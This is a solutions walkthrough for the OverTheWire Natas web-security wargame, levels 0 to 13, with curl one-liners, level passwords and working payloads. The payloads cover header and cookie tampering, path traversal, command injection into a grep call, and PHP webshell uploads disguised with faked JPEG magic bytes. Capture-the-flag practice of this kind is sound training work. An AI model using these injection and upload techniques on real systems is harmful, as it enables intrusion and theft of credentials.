# Solution

---

- natas0
    - ```Login to web:```
    - ```inspec element the page and look for comments```

- other solution:
    - ```view-source:http://natas0.natas.labs.overthewire.org/```

- curl:
    - ```curl -sv http://natas0.natas.labs.overthewire.org/ --user natas0:natas0 | grep -oe '<!--[A-Za-z].*' | cut -d ' ' -f6```

- python:
    - [natas0/solve.py](https://github.com/catx0rr/overthewire/blob/master/natas/natas1/solve.py)

- natas1
    - ```Login to web:```
    - ```view-source:http://natas0.natas.labs.overthewire.org/```

- curl:
    - ```curl -sv http://natas1.natas.labs.overthewire.org --user natas1:gtVrDuiDfck831PqWsLEZy5gyDz1clto | grep -o '<!--[A-Za-z].*' | awk '{print $6}'```
- python:
    - [natas1/solve.py](https://github.com/catx0rr/overthewire/blob/master/natas/natas1/solve.py)

- natas2
    - ```Login to web:```
    - ```view-source:http://natas2.natas.labs.overthewire.org```
    - ```click on files/pixel.png```
    - ```go back one directory and found users.txt```

- curl:
    - ```curl -sv http://natas2.natas.labs.overthewire.org/files/users.txt --user natas2:ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi | grep natas3 | awk -F: '{print $2}'```

- python:
    - [natas2/solve.py](https://github.com/catx0rr/overthewire/blob/master/natas/natas2/solve.py)

- natas3
    - ```Login to web:```
    - ```view-source:http://natas3.natas.labs.overthewire.org```
    - ```HINT:Not even Google will find it this time...```
    - ```http://natas3.natas.labs.overthewire.org/robots.txt```
    - ```Found: /s3cr3t/```
    - ```http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt```

- curl:
    - ```curl -sv http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt --user natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14 | grep natas4 | cut -d':' -f2```

- python:
    - [natas3/solve.py](https://github.com/catx0rr/overthewire/blob/master/natas/natas3/solve.py)

- natas4
    - ```Login to web:```
    - ```Access disallowed. You are visiting from "" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/" ```
    - ```Intercept data using proxy and burpsuite```
    - ```refresh page```
    - ```get a referer header from burpsuite: Referer: http://natas4.natas.labs.overthewire.org/index.php```
    - ```Send packet after changing request header to http://natas5.natas.labs.overthewire.org/```

- curl:
    - ```curl -sv http://natas4.natas.labs.overthewire.org/index.php -H "Referer: http://natas5.natas.labs.overthewire.org/" --user natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ | grep "Access" | cut -d' ' -f8```

- python:
    - [natas4/solve.py](https://github.com/catx0rr/overthewire/blob/master/natas/natas4/solve.py)

- natas5
    - ```Login to web:```
    - ```Access disallowed. You are not logged in```
    - ```It might be a problem with the session / cookie    by the error```
    - ```Chrome:```
        - ```Developer tools -> Application -> Storage -> Cookies -> loggedin 0 changed to 1 -> refresh```
    - ```Firefox:```
        - ```Developer tools -> Storage -> Cookies -> loggedin 0 changed to 1 -> refresh```
    - ```BurpSuite:```
        - ```Intercept data with burp proxy > changed Cookie: __utma=176859643.542715508.1591005549.1591005549.1591025816.2; __utmc=176859643; __utmz=176859643.1591005549.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); __utmb=176859643.7.10.1591025816; loggedin=1 -> Forward```

- curl:
    - ```curl -sv http://natas5.natas.labs.overthewire.org/ --user natas5:iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq --cookie 'loggedin=1' | grep "Access" | sed s'/<\/div>//g' | awk '{print $8}'```

- python:
    - [natas5/solve.py](https://github.com/catx0rr/overthewire/blob/master/natas/natas5/solve.py)

- natas6
    - ```Login to web:```
    - ```Input Secret:```
    - ```View the source code, found an includes file include "includes/secret.inc";```
    - ```view-source:http://natas6.natas.labs.overthewire.org/includes/secret.inc```
    - ```input the secret code: FOEIUWGHFEEUHOFUOIU```

- curl:
    - ```curl -X POST -sv http://natas6.natas.labs.overthewire.org/ --user natas6:aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1 -F secret=FOEIUWGHFEEUHOFUOIU -F submit=submit | grep "Access" | awk '{print $8}'```
    - ```curl -X POST -sv http://natas6.natas.labs.overthewire.org/ --user natas6:aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1 -H 'Content-Type: application/x-www-form-urlencoded' -d 'secret=FOEIUWGHFEEUHOFUOIU&submit=submit' | grep "Access" | awk '{print $8}'```

- python:
    [natas6/solve.py](https://github.com/catx0rr/overthewire/blob/master/natas/natas6/solve.py)

- natas7
    - ```Login to web:```
    - ```http://natas7.natas.labs.overthewire.org/index.php?page=home"```
    - ```View the source code, hint is: /etc/natas_webpass/natas8```
    - ```http://natas7.natas.labs.overthewire.org/index.php?page=/etc/passwd```
    - ```confirmed path traversal```
    - ```http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8```

- curl:
    - ```curl -X GET -sv http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8 --user natas7:7z3hEENjQtflzgnT29q7wAvMNfZdh0i9 | grep -oe '^[A-Za-z0-9].*$'```

- python:
    - [natas7/solve.py](https://github.com/catx0rr/overthewire/blob/master/natas/natas7/solve.py)

- natas8
    - ```Login to web:```
    - ```Input Secret:```
    - ```View the source code, found some code:```
        - ```$encodedSecret = "3d3d516343746d4d6d6c315669563362"; function encodeSecret($secret) { return bin2hex(strrev(base64_encode($secret))); }```
    - ``` On linux shell:```
    - ```echo -n "3d3d516343746d4d6d6c315669563362" | xxd -r -p | rev | base64 -d```
    - ```Input the encoded string```

- curl:
    - ```curl -X POST -sv -N http://natas8.natas.labs.overthewire.org/ --user natas8:DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe -F secret=$(echo -n "3d3d516343746d4d6d6c315669563362" | xxd -r -p | rev | base64 -d) -F submit=submit | grep -oe '^[A-Za-z0-9].*$' | cut -d' ' -f8 | tr -d '\n'```

- python:
    - [natas8/solve.py](https://github.com/catx0rr/overthewire/blob/master/natas/natas8/solve.py)

- natas9
    - ```Login to web:```
    - ```Find Containing words: <search>```
    - ```Found a code:```
        - ```if($key != "") { passthru("grep -i $key dictionary.txt");```
        - ```on php documentation: passthru is like exec() or system()```
        - ``` '[A-Za-z0-9].*$' /etc/natas_webpass/natas10 // on the search bar ("//" is a comment to comment out the dictionary.txt on grep function```
        - or ```;cat /etc/natas_webpass/natas10```

- curl:
    - ```curl -X POST -sv http://natas9.natas.labs.overthewire.org/ --user natas9:W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl -F needle="'^[A-Za-z0-9].*$' /etc/natas_webpass/natas10 //" -F submit=submit | grep -o '^\/.*' | awk -F: '{print $2}'```
    - ```curl -X POST -sv http://natas9.natas.labs.overthewire.org/ --user natas9:W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl -F needle="'^[A-Za-z0-9].*$' /etc/natas_webpass/natas10 | xargs echo" -F submit=submit | grep -v ^[\<A-Z].*$ | awk -F' ' '{print $2}'```

- python:
    - [natas9/solve.py](https://github.com/catx0rr/overthewire/blob/master/natas/natas9/solve.py)

- natas_10
    - ```Login to web:```
    - ```Find Containing words: <search>```
    - ```Found a code:```
        - ```";" and "&" is now filtered: if(preg_match('/[;|&]/',$key)) {```
        - ```on php documentation: passthru is like exec() or system()```
        - ``` '[A-Za-z0-9].*$' /etc/natas_webpass/natas11 \ on the search bar ("//" is a comment to comment out the dictionary.txt on grep function```
        - or ``` .* /etc/natas_webpass/natas11 -> to grep multiple files```

- curl:
    - ```curl -X POST -sv http://natas10.natas.labs.overthewire.org/ --user natas10:nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu -F needle="'^[A-Za-z0-9].*$' /etc/natas_webpass/natas11 \\" -F submit=submit | grep -o '\/etc.*' | awk -F: '{print $2}'```

- python:
    - [natas10/solve.py](https://github.com/catx0rr/overthewire/blob/master/natas/natas_10/solve.py)

- natas_11
    - ```Login to web:```
    - ```"Cookies are protected with XOR encryption"```
    - ```Checked the source code:```
    - ```Use the xor function and the given plaintext and ciphertext to get the key```
    - ```After getting the key, changed the value of show password to 'yes' to show the data```
    - ```Pass the xor encrypted, base64 encoded cookie. to the browser and 'Set Color'```

- curl:
    - ```After decoding the key and get the xor encrypted base64 encoded cookie value pass it on curl:```
        -```curl -X POST -sv http://natas11.natas.labs.overthewire.org/ --user natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK --cookie 'data=ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK' -F value='#ffffff' -F submit=submit | grep -oe '[a-zA-Z0-9]\{32\}'.*\<br\> | tr -d '<br>'```

- python:
    - [natas11/solve.py](https://github.com/catx0rr/overthewire/blob/master/natas/natas_11/solve.py)

- natas_12
    - ```Login to web:```
    - ```Upload a file to get password```
    - ```Created a file contains remote execution command system('cat /etc/natas_webpass/natas13')```
    - ```Changed the hidden input .jpg to .php to successfully upload the php file```
    - ``` Upload the php file, and then go to the file that has been uploaded on [domain]/upload/[uploadedfile].php```
    - ```or change using Burpsuite```

- python:
    - [natas11/solve.py](https://github.com/catx0rr/overthewire/blob/master/natas/natas_12/solve.py)

- natas_13
    - ```Create a .jpg file with terminal:```
    - ```echo '<?php system("/etc/natas_webpass/natas14"); ?>' > test.jpg```
    - ```Edit magic numbers so you may upload the file as fake jpg```
    - ```hexeditor -b test.jpg```
    - ```Add nullbyte (Ctrl+A)```
    - ```Modify the null magic number into jpg file since exif_imagetype() function reads the first byte to check the signature```
    - ```FF D8 FF DB```
    - ```PHP function: https://www.php.net/manual/en/function.exif-imagetype.php```
    - ```Magic Numbers: https://en.wikipedia.org/wiki/List_of_file_signatures```

- send the data:
    - ```Login to web:```
    - ```Upload a file to get password```
    - ```Created a file contains remote execution command system('cat /etc/natas_webpass/natas13')```
    - ```Changed the hidden input .jpg to .php to successfully upload the php file```
    - ``` Upload the php file, and then go to the file that has been uploaded on [domain]/upload/[uploadedfile].php```
    - ```or change using Burpsuite```

- python:
    - [natas11/solve.py](https://github.com/catx0rr/overthewire/blob/master/natas/natas_13/solve.py)
